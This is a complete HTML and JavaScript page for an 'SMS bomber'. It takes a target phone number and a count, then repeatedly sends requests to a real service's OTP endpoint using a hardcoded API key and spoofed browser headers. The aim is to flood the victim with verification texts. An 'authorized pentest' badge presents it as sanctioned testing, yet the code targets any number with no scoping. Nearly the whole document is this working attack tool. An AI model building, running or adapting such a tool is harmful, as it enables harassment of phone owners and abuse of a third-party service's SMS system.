<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SMS BOM NI CHOSO – Hacker Edition</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
:root {
  --primary-glow: #00ff88;
  --secondary-glow: #00ccff;
  --dark-bg: #0a0a0a;
  --card-bg: rgba(20, 20, 40, 0.95);
  --text-glow: #00ff88;
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  font-family: 'Orbitron', monospace;
  background: linear-gradient(45deg, var(--dark-bg), #000011);
  min-height: 100vh;
  overflow-x: hidden;
  position: relative;
}

body::before {
  content: '';
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: 
    radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
    radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%),
    radial-gradient(circle at 40% 40%, rgba(120,219,255,0.3) 0%, transparent 50%);
  animation: pulse 4s ease-in-out infinite alternate;
  z-index: -1;
}

@keyframes pulse {
  0% { opacity: 0.5; transform: scale(1); }
  100% { opacity: 0.8; transform: scale(1.05); }
}

.container {
  max-width: 600px;
  margin: 2rem auto;
  padding: 2rem;
  perspective: 1000px;
}

.title {
  text-align: center;
  font-size: 2.5rem;
  font-weight: 900;
  background: linear-gradient(45deg, var(--primary-glow), var(--secondary-glow));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  text-shadow: 0 0 30px var(--primary-glow);
  margin-bottom: 2rem;
  animation: glow 2s ease-in-out infinite alternate;
}

@keyframes glow {
  from { filter: drop-shadow(0 0 20px var(--primary-glow)); }
  to { filter: drop-shadow(0 0 40px var(--primary-glow)); }
}

.auth-badge {
  display: inline-block;
  background: linear-gradient(45deg, #ff4444, #ff8800);
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 50px;
  font-size: 0.8rem;
  font-weight: 700;
  margin-bottom: 1rem;
  box-shadow: 0 0 20px rgba(255,68,68,0.5);
  animation: blink 2s infinite;
}

@keyframes blink {
  0%, 50% { opacity: 1; }
  51%, 100% { opacity: 0.7; }
}

.card {
  background: var(--card-bg);
  backdrop-filter: blur(20px);
  border: 1px solid rgba(0,255,136,0.3);
  border-radius: 20px;
  padding: 2.5rem;
  box-shadow: 
    0 20px 40px rgba(0,0,0,0.5),
    0 0 50px rgba(0,255,136,0.2);
  transform-style: preserve-3d;
  transition: transform 0.3s ease;
}

.card:hover {
  transform: rotateX(5deg) rotateY(5deg) translateZ(20px);
}

label {
  display: block;
  margin: 1.5rem 0 0.5rem;
  color: #ccc;
  font-weight: 700;
  text-shadow: 0 0 10px var(--text-glow);
}

input[type="text"], input[type="number"] {
  width: 100%;
  padding: 1rem;
  background: rgba(0,0,0,0.7);
  border: 2px solid rgba(0,255,136,0.5);
  border-radius: 12px;
  color: #00ff88;
  font-family: 'Orbitron', monospace;
  font-size: 1.1rem;
  transition: all 0.3s ease;
  box-shadow: inset 0 0 20px rgba(0,255,136,0.1);
}

input:focus {
  outline: none;
  border-color: var(--primary-glow);
  box-shadow: 
    0 0 30px rgba(0,255,136,0.6),
    inset 0 0 20px rgba(0,255,136,0.3);
  background: rgba(0,30,20,0.9);
}

.btn {
  padding: 1rem 2rem;
  margin: 1.5rem 0.5rem 0 0;
  border: none;
  border-radius: 12px;
  font-family: 'Orbitron', monospace;
  font-weight: 700;
  font-size: 1.1rem;
  cursor: pointer;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

.btn-primary {
  background: linear-gradient(45deg, var(--primary-glow), #00cc66);
  color: #000;
  box-shadow: 0 0 30px rgba(0,255,136,0.6);
}

.btn-primary:hover {
  transform: translateY(-3px);
  box-shadow: 0 10px 40px rgba(0,255,136,0.8);
}

.btn-danger {
  background: linear-gradient(45deg, #ff4444, #ff6666);
  color: white;
  box-shadow: 0 0 30px rgba(255,68,68,0.6);
}

.btn-danger:hover {
  transform: translateY(-3px);
  box-shadow: 0 10px 40px rgba(255,68,68,0.8);
}

pre {
  background: rgba(0,0,0,0.9);
  backdrop-filter: blur(15px);
  color: var(--primary-glow);
  padding: 1.5rem;
  border-radius: 15px;
  border: 1px solid rgba(0,255,136,0.3);
  margin-top: 2rem;
  font-family: 'Orbitron', monospace;
  font-size: 0.95rem;
  line-height: 1.6;
  max-height: 400px;
  overflow-y: auto;
  box-shadow: inset 0 0 30px rgba(0,255,136,0.1);
}

.status {
  padding: 1rem;
  margin: 1rem 0;
  border-radius: 10px;
  font-weight: 700;
  text-align: center;
}

.success { background: rgba(0,255,136,0.2); color: var(--primary-glow); border: 1px solid var(--primary-glow); }
.error { background: rgba(255,68,68,0.2); color: #ff6666; border: 1px solid #ff4444; }

.matrix {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  pointer-events: none;
  z-index: -1;
  opacity: 0.1;
}

@keyframes matrix {
  0%, 100% { opacity: 0.1; }
  50% { opacity: 0.2; }
}
</style>
</head>
<body>
  <div class="matrix"></div>
  
  <div class="container">
    <h1 class="title">SMS BOM NI CHOSO</h1>
    
    <div class="auth-badge">
      🔐 AUTHORIZED PENTEST | Scope Verified
    </div>
    
    <div class="card">
      <form id="bombForm">
        <label>🎯 Target Phone Number</label>
        <input type="text" id="phone" placeholder="+639XXXXXXXXX" required>
        
        <label>💣 SMS Count</label>
        <input type="number" id="count" min="1" value="10" required>
        
        <div>
          <button type="submit" class="btn btn-primary">🚀 LAUNCH ATTACK</button>
          <button type="button" class="btn btn-danger" onclick="clearLogs()">🧹 CLEAR LOGS</button>
        </div>
      </form>
      
      <div id="status" class="status" style="display:none;"></div>
    </div>
    
    <pre id="log">🟢 Pentest tool initialized...</pre>
  </div>

<script>
/* --------------- Configuration --------------- */
const URL = 'https://api.s5.com/player/api/v1/otp/request';
const HEADERS = {
  'accept': 'application/json, text/plain, */*',
  'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
  'x-api-type': 'external',
  'x-locale': 'en',
  'x-timezone-offset': '480',
  'origin': 'https://www.s5.com',
  'referer': 'https://www.s5.com/',
  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
};
const DELAY_MS = 100;
const REQUEST_TIMEOUT = 1000;

/* --------------- Utility helpers --------------- */
function log(msg) {
  const logEl = document.getElementById('log');
  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
  logEl.scrollTop = logEl.scrollHeight;
}

function showStatus(msg, type) {
  const statusEl = document.getElementById('status');
  statusEl.textContent = msg;
  statusEl.className = `status ${type}`;
  statusEl.style.display = 'block';
  setTimeout(() => statusEl.style.display = 'none', 3000);
}

function clearLogs() {
  document.getElementById('log').textContent = '🟢 Logs cleared | Ready for next test\n';
  showStatus('Logs cleared', 'success');
}

function delay(ms) {
  return new Promise(r => setTimeout(r, ms));
}

/* --------------- One-time OTP request --------------- */
async function sendOtpOnce(phone) {
  const body = new FormData();
  body.append('phone_number', phone);

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);

    const response = await fetch(URL, {
      method: 'POST',
      headers: HEADERS,
      body: body,
      signal: controller.signal
    });

    clearTimeout(timer);
    const text = await response.text();
    return { status: response.status, text: text.slice(0, 100) + (text.length > 100 ? '...' : '') };
  } catch (e) {
    return { status: 'ERR', text: e.message };
  }
}

/* --------------- Attack handler --------------- */
document.getElementById('bombForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const phone = document.getElementById('phone').value.trim();
  const count = parseInt(document.getElementById('count').value, 10);

  if (!phone) { 
    showStatus('❌ Phone number required', 'error');
    return; 
  }
  if (isNaN(count) || count < 1) { 
    showStatus('❌ Count must be ≥ 1', 'error');
    return; 
  }

  // Disable form during attack
  const btn = e.target.querySelector('button[type="submit"]');
  const originalText = btn.textContent;
  btn.textContent = '🔥 ATTACKING...';
  btn.disabled = true;

  log(`🚀 TARGET ACQUIRED: ${phone}`);
  log(`💣 LAUNCHING ${count} OTP MISSILES | DELAY: ${DELAY_MS}ms`);
  log('='.repeat(50));

  showStatus(`Attack launched: ${count} SMS to ${phone}`, 'success');

  for (let i = 1; i <= count; i++) {
    const { status, text } = await sendOtpOnce(phone);
    log(`💥 [${i}/${count}] STATUS: ${status} | RESPONSE: ${text}`);

    if (i < count) await delay(DELAY_MS);
  }

  log('='.repeat(50));
  log('✅ TARGET HIT | ATTACK COMPLETE');
  log('🔄 Ready for next target...');
  
  // Re-enable form
  btn.textContent = originalText;
  btn.disabled = false;
  
  showStatus('Attack completed successfully', 'success');
});
</script>
</body>
</html>
